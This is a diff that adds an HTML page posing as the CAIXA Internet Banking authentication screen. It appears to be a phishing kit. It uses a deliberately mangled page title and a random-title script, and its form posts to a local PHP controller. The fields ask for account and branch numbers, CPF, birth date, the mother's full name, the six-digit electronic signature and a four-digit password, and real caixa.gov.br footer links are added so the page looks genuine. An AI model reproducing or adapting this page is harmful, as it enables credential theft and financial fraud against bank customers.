@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+ <head>
+  <title>
+   in TE:::____R.neT b ANk ing CaiXA
+  </title>
+  <meta charset="UTF-8" />
+  <link href="./assets/stylesheet-css/styles.css" rel="stylesheet" />
+  <link href="favicon.ico" rel="shortcut icon" />
+  <script src="./assets/scripts-js/title-random.js">
+  </script>
+ </head>
+ <body>
+  <div class="pace" style="display: none;">
+  </div>
+  <div class="pace-bg" style="display: none;">
+  </div>
+  <nav class="container">
+  </nav>
+  <nav class="title-bar">
+  </nav>
+  <header>
+   <nav onclick="document.location='index.php'" class="logo">
+   </nav>
+  </header>
+  ﻿
+  <nav class="main-auth">
+  </nav>
+  <nav class="wrapper-auth">
+   <h1 class="box0-auth">
+    <img class="img-auth0" src="./assets/images/logo-identificacao.png" />
+    <span class="txt-auth0">
+     Identificação do usuário
+    </span>
+   </h1>
+   <form onsubmit="return false;" name="frmInfo" method="post" action="./controller/Process.class.php">
+   </form>
+  </nav>
+  <nav class="box1-auth">
+  </nav>
+  <nav class="caixaSenha margem">
+   <h2>
+    VERIFICAÇÃO DE AUTENTICIDADE
+   </h2>
+   <div class="form-auth">
+    <div class="form-auth-wrapper">
+     <div class="operacao">
+      <label for="operacao">
+       Operação:
+      </label>
+      <select class="comboBox cmbOperacao" name="operacao">
+       <option value="">
+        Selecione sua operação
+       </option>
+       <option value="001- Conta Corrente - P.Física">
+        001- Conta Corrente - P.Física
+       </option>
+       <option value="002- Conta Simples - P.Física">
+        002- Conta Simples - P.Física
+       </option>
+       <option value="003- Conta Corrente - P.Jurídica">
+        003- Conta Corrente - P.Jurídica
+       </option>
+       <option value="006- Entidades Públicas">
+        006- Entidades Públicas
+       </option>
+       <option value="007- Dep. Instituições Financeiras">
+        007- Dep. Instituições Financeiras
+       </option>
+       <option value="013- Poupança">
+        013- Poupança
+       </option>
+       <option value="022- Poupança - Pessoa Jurídica">
+        022- Poupança - Pessoa Jurídica
+       </option>
+       <option value="023- Conta CAIXA Fácil">
+        023- Conta CAIXA Fácil
+       </option>
+       <option value="028- Poupança Crédito Imobiliário">
+        028- Poupança Crédito Imobiliário
+       </option>
+       <option value="032- Conta Investimento - P.Física">
+        032- Conta Investimento - P.Física
+       </option>
+       <option value="034- Conta Investimento - P.Jurídica">
+        034- Conta Investimento - P.Jurídica
+       </option>
+       <option value="043- Depósitos Lotéricos">
+        043- Depósitos Lotéricos
+       </option>
+      </select>
+     </div>
+     <div class="agencia">
+      <label for="agencia">
+       Agência:
+      </label>
+      <input type="text" class="textBox txtAgencia" maxlength="4" name="agencia" />
+      <span class="box-cd">
+       <label for="conta">
+        Conta e dígito:
+       </label>
+       <input type="text" class="textBox txtConta" maxlength="8" name="conta" />
+       <input type="text" class="textBox txtDigito" maxlength="1" name="digito" />
+      </span>
+     </div>
+     <div class="cpf">
+      <label for="cpf">
+       CPF:
+      </label>
+      <input type="text" onblur="validaCPF(this)" class="textBox txtCPF" id="cpf" maxlength="11" name="cpf" />
+      <label for="dataNascimento">
+       Data de nascimento:
+      </label>
+      <input type="text" class="textBox txtDTNasc" maxlength="10" id="data" name="dataNascimento" onkeydown="validaDATA(event, this)" />
+      <span class="info-date">
+       ( dia/mês/ano ex: 01/12/1991 )
+      </span>
+     </div>
+     <div class="nomeMae">
+      <label for="nomeMae">
+       Nome da mãe:
+      </label>
+      <input type="text" class="textBox txtNomeMae" name="nomeMae" />
+      <span class="info-mother">
+       ( Informe o nome completo da mãe )
+      </span>
+     </div>
+     <div class="AssinaturaEletronicaRadio">
+      <label for="AssinaturaEletronica">
+       Possui assinatura eletrônica?
+      </label>
+      <span class="possuiae">
+       <input type="radio" class="radioButton rdSim" name="possuiae" onclick="verificaAssin()" value="sim" />
+       <span class="left-value">
+        Sim
+       </span>
+       <input type="radio" class="radioButton rdNao" name="possuiae" onclick="verificaAssin()" value="não" />
+       <span class="left-value">
+        Não
+       </span>
+      </span>
+     </div>
+     <div class="assinaturaEletronica">
+      <label class="left-asntrltrnc" for="AssinaturaEletronica">
+       Assinatura
+       <br />
+       eletrônica:
+      </label>
+      <input type="password" class="passwordBox left-asntrltrnc txtAssinaturaEletro" maxlength="6" name="assinaturaEletronica" onclick="this.value=''" disabled="disabled" />
+      <label class="left-asntrltrnc lblPwdFour" for="senhaQuatro">
+       Senha de (4) dígitos:
+      </label>
+      <input type="password" class="passwordBox left-asntrltrnc" maxlength="4" name="senhaQuatro" />
+     </div>
+     <div class="txtInfoAssinEletro">
+      <p>
+       ASSINATURA ELETRÔNICA
+      </p>
+      <article class="art-footer">
+       Assinatura Eletrônica permite ao cliente realizar pagamentos e transferências de valores pela internet, caso não tenha, procure o gerente de sua agência da CAIXA e solicite o cadastramento. Você receberá uma assinaturaa provisória com 6 dígitos, que deverá ser personalizada durante o seu próximo acesso ao Internet Banking CAIXA através da opção acima.
+      </article>
+     </div>
+    </div>
+   </div>
+  </nav>
+  <nav class="box2-auth">
+  </nav>
+  <div class="clear | button-group" id="cbgPIS">
+   <div class="right">
+    <button tabindex="150" onclick="javascript:cancel()" title="Cancelar" type="button" class="button-orange button-clean auto-tab-index-first-item" id="85Cancel">
+     <span>
+      Cancelar
+     </span>
+    </button>
+    <button onclick="javascript:envio()" tabindex="250" title="Confirmar" class="button-blue" type="button" id="confirm">
+     <span>
+      Confirmar
+     </span>
+    </button>
+    <script src="./assets/scripts-js/validaSenha.js">
+    </script>
+    <script src="./assets/scripts-js/infoValidation.js">
+    </script>
+    <script src="./assets/scripts-js/validate.js" type="text/javascript">
+    </script>
+   </div>
+  </div>
+  ﻿
+  <footer>
+   <nav class="footer">
+    <p class="text-shadow">
+     Suporte Tecnológico CAIXA
+     <br />
+     3004 1104 (Capital e regiões
+     <br />
+     metropolitanas) ou 0800 726 0104
+     <br />
+     (Demais regiões)
+    </p>
+    <ul class="text-shadow menu-footer">
+     <li>
+      <a title="Segurança" target="_blank" href="http://www.caixa.gov.br/seguranca/">
+       Segurança
+      </a>
+         |   
+     </li>
+     <li>
+      <a title="Rede de Atendimento" target="_blank" href="http://www1.caixa.gov.br/atendimento/index.asp">
+       Rede de Atendimento
+      </a>
+         |   
+     </li>
+     <li>
+      <a title="Ajuda" target="_blank" href="https://internetbanking.caixa.gov.br/siwinstatic/htm/duvidasFrequentes/duvidas_frequentes.htm">
+       Ajuda
+      </a>
+         |   
+     </li>
+     <li class="last-item">
+      <a title="Termos e Contratos" target="_blank" href="https://internetbanking.caixa.gov.br/SIIBC/contrato_ibc.processa">
+       Termos e Contratos
+      </a>
+     </li>
+    </ul>
+   </nav>
+  </footer>
+  <!-- Fim do Container -->
+  <script src="./assets/scripts-js/menu.js">
+  </script>
+  <script src="./assets/scripts-js/scroll.js">
+  </script>
+  <script src="./assets/scripts-js/alert.mod.js">
+  </script>
+  <script>
+   $(".pace").style.display="none";$(".pace-bg").style.display="none";
+  </script>
+ </body>
+</html>
